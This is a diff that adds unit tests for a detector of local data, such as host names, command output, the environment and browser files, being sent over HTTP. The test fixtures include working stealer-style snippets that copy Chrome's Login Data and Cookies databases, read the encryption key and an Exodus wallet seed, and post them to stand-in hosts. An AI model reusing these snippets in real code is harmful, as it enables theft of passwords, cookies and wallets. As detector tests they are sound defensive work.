@@ -160,6 +160,163 @@ class FlowNamesTests(unittest.TestCase):
         self.assertEqual(self.kind(near), ("identity", "hostname"))         # (a short text: anywhere)
 
 
+class FlowShapesTests(unittest.TestCase):
+    """The detection round (0.1.8): shapes the data flow did not connect. A
+    name spread whole; a function's own return, past the functions defined
+    in its body; a method called on a receiver, and the `.then(…)` after a
+    call of a function that returns data; a callback the script's own
+    function calls with data; a class's constructor, a thread's target; a
+    merge; a destructured loop; the machine's modules and HTTP clients under
+    the script's own names. A parameter holds what it is given only in its
+    function (two functions' parameters of one name are two names)."""
+
+    SEND = "fetch('https://x.invalid/', {method: 'POST', body: %s});\n"
+    OS = "const os = require('os');\n"
+
+    def kind(self, text):
+        found = core.local_data_sent_at(text)
+        return None if found is None else found[1:3]
+
+    def test_a_name_spread_whole(self):
+        js = (self.OS + "function collect() {\n  const base = { host: os.hostname() };\n"
+              "  return { ...base, t: Date.now() };\n}\nconst data = collect();\n" + self.SEND % "JSON.stringify(data)")
+        self.assertEqual(self.kind(js), ("identity", "hostname"))
+        merged = (self.OS + "const tags = {};\ntags.host = os.hostname();\nfunction send(extra) {\n"
+                  "  const all = { ...tags, ...extra };\n  " + self.SEND % "JSON.stringify(all)" + "}\nsend({});\n")
+        self.assertEqual(self.kind(merged), ("identity", "hostname"))
+        self.assertIsNone(self.kind(self.OS + "const v = x.base;\n" + self.SEND % "JSON.stringify({...v})"))
+
+    def test_a_return_is_its_own_functions(self):
+        nested = (self.OS + "function collect() {\n  const pick = (x) => x.trim();\n"
+                  "  const ip = (() => { return '1.2.3.4'; })();\n  return { host: pick(os.hostname()), ip };\n}\n"
+                  "const payload = collect();\n" + self.SEND % "JSON.stringify(payload)")
+        self.assertEqual(self.kind(nested), ("identity", "hostname"))
+        inner = (self.OS + "function outer() {\n  function inner() { return os.hostname(); }\n  return 1;\n}\n"
+                 + self.SEND % "String(outer())")
+        self.assertIsNone(self.kind(inner))
+        py = ("import socket, requests\ndef collect():\n    def clean(x):\n        return x.strip()\n"
+              "    return {'h': clean(socket.gethostname())}\nrequests.post('https://x.invalid', json=collect())\n")
+        self.assertEqual(self.kind(py), ("identity", "user or host name"))
+
+    def test_methods_on_a_receiver_and_then(self):
+        js = (self.OS + "class T {\n  info() { return { host: os.hostname() }; }\n"
+              "  go() { const i = this.info(); " + self.SEND % "JSON.stringify(i)" + "  }\n}\n")
+        self.assertEqual(self.kind(js), ("identity", "hostname"))
+        self.assertIsNone(self.kind(js.replace("this.info()", "this.other()")))
+        py = ("import socket, requests\nclass C:\n    def info(self):\n        return {'h': socket.gethostname()}\n"
+              "    def go(self):\n        requests.post('https://x.invalid', json=self.info())\n")
+        self.assertEqual(self.kind(py), ("identity", "user or host name"))
+        then = (self.OS + "function collect() { return new Promise((resolve) => resolve({ host: os.hostname() })); }\n"
+                "collect().then((d) => " + self.SEND % "JSON.stringify(d)" + ");\n")
+        self.assertEqual(self.kind(then), ("identity", "hostname"))
+
+    def test_callbacks_constructors_and_threads(self):
+        callback = (self.OS + "function collect(cb) { cb(null, { h: os.hostname() }); }\n"
+                    "collect(function (err, info) { " + self.SEND % "JSON.stringify(%s)" + " });\n")
+        self.assertEqual(self.kind(callback % "info"), ("identity", "hostname"))
+        self.assertIsNone(self.kind(callback % "err"))
+        ctor = (self.OS + "class E {\n  constructor(d) { this.d = d; }\n  go() { " + self.SEND % "JSON.stringify(this.d)"
+                + " }\n}\nnew E(%s).go();\n")
+        self.assertEqual(self.kind(ctor % "os.hostname()"), ("identity", "hostname"))
+        self.assertIsNone(self.kind(ctor % "'x'"))
+        thread = ("import socket, threading, requests\ndef send(d):\n    requests.post('https://x.invalid', json=d)\n"
+                  "threading.Thread(target=send, args=(%s,)).start()\n")
+        self.assertEqual(self.kind(thread % "socket.gethostname()"), ("identity", "user or host name"))
+        self.assertIsNone(self.kind(thread % "'x'"))
+
+    def test_a_parameter_is_its_functions(self):
+        # (paramiko's config.py: the machine's name given one function's `hostname`, another's sent in a lookup)
+        py = ("import socket\nclass Lazy:\n    def __init__(self, host):\n        self.host = host\n"
+              "def lookup(hostname):\n    return socket.getaddrinfo(hostname, None)\n"
+              "def canonicalize(hostname, domains):\n    for d in domains:\n"
+              "        candidate = '{}.{}'.format(hostname, d)\n        socket.gethostbyname(candidate)\n"
+              "fqdn = Lazy(socket.gethostname())\nlookup(fqdn.host)\n")
+        self.assertIsNone(self.kind(py))
+        self.assertEqual(self.kind(py.replace("def canonicalize(hostname, domains)", "def canonicalize(host, domains)")
+                                   .replace("format(hostname, d)", "format(socket.gethostname(), d)")),
+                         ("identity", "user or host name"))
+
+    def test_a_lookup_of_a_name_composed_with_a_literal(self):
+        # (a name given a read and a literal in one statement counts, whenever it is followed)
+        for py in ("import socket\nh = socket.gethostname()\nq = h + '.x.invalid.com'\nsocket.getaddrinfo(q, 80)\n",
+                   "import socket\nq = socket.gethostname() + '.x.invalid.com'\nsocket.getaddrinfo(q, 80)\n"):
+            with self.subTest(py=py):
+                self.assertEqual(self.kind(py), ("identity", "user or host name"))
+        self.assertIsNone(self.kind("import socket\nh = socket.gethostname()\nsocket.getaddrinfo(h, 80)\n"))
+
+    def test_command_runners_under_other_names(self):
+        promisified = ("const util = require('util');\nconst run = util.promisify(require('child_process').exec);\n"
+                       "(async () => { const { stdout } = await run('whoami'); " + self.SEND % "stdout" + " })();\n")
+        self.assertEqual(self.kind(promisified), ("identity", "whoami"))
+        then = ("const { promisify } = require('util');\nconst { exec } = require('child_process');\n"
+                "const execP = promisify(exec);\nexecP('hostname').then(({ stdout }) => " + self.SEND % "stdout" + ");\n")
+        self.assertEqual(self.kind(then), ("identity", "hostname"))
+        self.assertIsNone(self.kind(then.replace("execP('hostname')", "execP('echo ok')")))
+        py = ("import asyncio, aiohttp\nasync def main():\n"
+              "    p = await asyncio.create_subprocess_shell('whoami', stdout=asyncio.subprocess.PIPE)\n"
+              "    out, _ = await p.communicate()\n    async with aiohttp.ClientSession() as s:\n"
+              "        await s.post('https://x.invalid', data=out)\n")
+        self.assertEqual(self.kind(py), ("identity", "whoami"))
+        tuples = "import getpass, socket, requests\nuser, host = getpass.getuser(), %s\nrequests.post('https://x.invalid', data=host)\n"
+        self.assertEqual(self.kind(tuples % "socket.gethostname()"), ("identity", "user or host name"))
+        self.assertIsNone(self.kind(tuples % "'x'"))
+
+    def test_browser_profiles_and_copied_files(self):
+        chrome = ("import os, shutil, sqlite3, requests\n"
+                  "db = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')\n"
+                  "shutil.copy2(db, 'Loginvault.db')\nconn = sqlite3.connect('Loginvault.db')\ncursor = conn.cursor()\n"
+                  "cursor.execute('SELECT origin_url, username_value, password_value FROM logins')\n"
+                  "rows = cursor.fetchall()\nrequests.post('https://x.invalid', json=rows)\n")
+        self.assertEqual(self.kind(chrome), ("file", "Loginvault.db"))
+        self.assertIsNone(self.kind(chrome.replace("shutil.copy2(db, 'Loginvault.db')\n", "")))
+        state = ("import os, json, requests\np = os.path.expandvars(r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State')\n"
+                 "key = json.load(open(p))['os_crypt']['encrypted_key']\nrequests.post('https://x.invalid', data=key)\n")
+        self.assertEqual(self.kind(state)[0], "file")
+        seed = "import requests\nd = open('%APPDATA%\\\\Exodus\\\\exodus.wallet\\\\seed.seco', 'rb').read()\n" \
+               "requests.post('https://x.invalid', data=d)\n"
+        self.assertEqual(self.kind(seed)[0], "file")
+        js = ("const fs = require('fs'), path = require('path'), os = require('os');\nconst Database = require('better-sqlite3');\n"
+              "const src = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies');\n"
+              "const tmp = path.join(os.tmpdir(), 'c.db');\nfs.copyFileSync(src, tmp);\n"
+              "const rows = new Database(tmp).prepare('SELECT host_key, name, encrypted_value FROM cookies').all();\n"
+              + self.SEND % "JSON.stringify(rows)")
+        self.assertEqual(self.kind(js), ("file", "tmp"))
+
+    def test_merges_and_destructured_loops(self):
+        merge = self.OS + "const o = {};\nObject.assign(o, { h: os.hostname() });\n" + self.SEND % "JSON.stringify(o)"
+        self.assertEqual(self.kind(merge), ("identity", "hostname"))
+        loop = (self.OS + "const out = [];\nfor (const [name, list] of Object.entries(os.networkInterfaces())) "
+                "out.push(name);\n" + self.SEND % "out.join(',')")
+        self.assertEqual(self.kind(loop), ("report", "networkInterfaces"))
+        py = ("import os, requests\nd = []\nfor k, v in os.environ.items():\n    d.append(k + '=' + v)\n"
+              "requests.post('https://x.invalid', data='\\n'.join(d))\n")
+        self.assertEqual(self.kind(py), ("environment", "the whole environment"))
+
+    def test_modules_and_clients_under_other_names(self):
+        self.assertEqual(self.kind("const o = require('os');\n" + self.SEND % "JSON.stringify({ h: o.hostname() })"),
+                         ("identity", "hostname"))
+        self.assertEqual(self.kind("import * as o from 'node:os';\n" + self.SEND % "o.homedir()"),
+                         ("report", "homedir"))
+        self.assertEqual(self.kind("import platform as pl, requests\nrequests.post('https://x.invalid', data=pl.node())\n"),
+                         ("identity", "user or host name"))
+        self.assertIsNone(self.kind("const o = require('os');\n" + self.SEND % "o.platform()"))
+        clients = {
+            "const nf = require('node-fetch');\nnf('https://x.invalid', { method: 'POST', body: os.hostname() });\n":
+                ("identity", "hostname"),
+            "const api = require('axios').create({});\napi.post('/c', { h: os.hostname() });\n": ("identity", "hostname"),
+            "import request from 'request';\nrequest.post({ url: 'https://x.invalid', json: { h: os.hostname() } });\n":
+                ("identity", "hostname"),
+        }
+        for js, want in clients.items():
+            with self.subTest(js=js):
+                self.assertEqual(self.kind(self.OS + js), want)
+        py = ("import socket, requests\ns = requests.Session()\ns.post('https://x.invalid', json={'h': socket.gethostname()})\n")
+        self.assertEqual(self.kind(py), ("identity", "user or host name"))
+        with_client = ("import socket, httpx\nwith httpx.Client() as c:\n"
+                       "    c.request('POST', 'https://x.invalid', json={'h': socket.gethostname()})\n")
+        self.assertEqual(self.kind(with_client), ("identity", "user or host name"))
+
+
 class ImportTimeGradingTests(unittest.TestCase):
     def grade(self, text):
         reasons, line = core.import_time_risk(text)
@@ -395,7 +552,8 @@ class BoundsTests(unittest.TestCase):
         beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
         for tail in (" " * 200_000 + "'a' " * 50_000, "x = 1; " + "'a'; " * 60_000, "#\n" * 100_000,
                      '"""\n' * 50_000, "(" * 100_000 + "'a'\n" * 20_000, "\\\n'a'\n" * 40_000,
-                     "powershell " * 50_000 + "os.system(" * 1000):
+                     "powershell " * 50_000 + "os.system(" * 1000, "for (" + " " * 100_000 + "x",
+                     "for " + " " * 100_000 + "x", "(a, b" + " " * 100_000 + "x"):
             for lang in ("py", "js"):
                 t0 = time.monotonic()
                 self.assertTrue(core.import_time_risk(beacon + tail, lang)[0])
